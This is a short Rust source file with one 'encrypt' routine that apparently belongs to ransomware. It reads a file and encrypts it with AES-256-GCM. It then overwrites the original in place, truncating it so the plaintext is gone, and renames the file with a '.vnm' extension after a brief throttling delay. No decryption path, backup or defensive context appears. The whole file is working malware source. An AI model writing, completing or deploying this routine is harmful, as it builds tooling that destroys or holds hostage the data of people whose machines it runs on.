use anyhow::{Result, Context};
use std::path::{Path, PathBuf};
use std::env;
use std::fs;
use std::io::Write;
use std::time::Duration;
use std::thread::sleep;
use std::fs::OpenOptions;

use aes_gcm::{Aes256Gcm, Nonce, KeyInit, aead::{Aead, AeadCore, OsRng}};


/// Encryption routine
pub fn encrypt(path: &Path, KEY: &[u8; 32]) -> Result<()> {
    
    sleep(Duration::from_millis(50));
    let content = fs::read(path).context("[!] Failed to read the content of the file !")?;

    let cipher = Aes256Gcm::new_from_slice(KEY).unwrap();
    let nonce = Aes256Gcm::generate_nonce(&mut OsRng);
    let mut xxxx = nonce.to_vec();
    
    xxxx.extend(cipher.encrypt(&nonce, content.as_ref()).unwrap());
    // Open the file with write permissions
    let mut file = OpenOptions::new()
        .write(true)
        .truncate(true) // Truncate the file to 0 bytes
        .open(path)
        .context("[!] Failed to open file")?;

    // Write the modification data to the file
    file.write_all(&xxxx)
        .context("[!] Failed to write modification data to file")?;
    
    // Close the file before renaming
    drop(file);
    

    // Rename the file with .vnm extension
    let new_name = path.file_name().context("[!] Failed to get the file name!")?;
    let mut new_name_os = new_name.to_os_string();  
    new_name_os.push(".vnm");

    let new_path = path.with_file_name(new_name_os);
    fs::rename(path, &new_path)
        .context("[!] Failed to rename file with .vnm extension")?;

    Ok(())
}


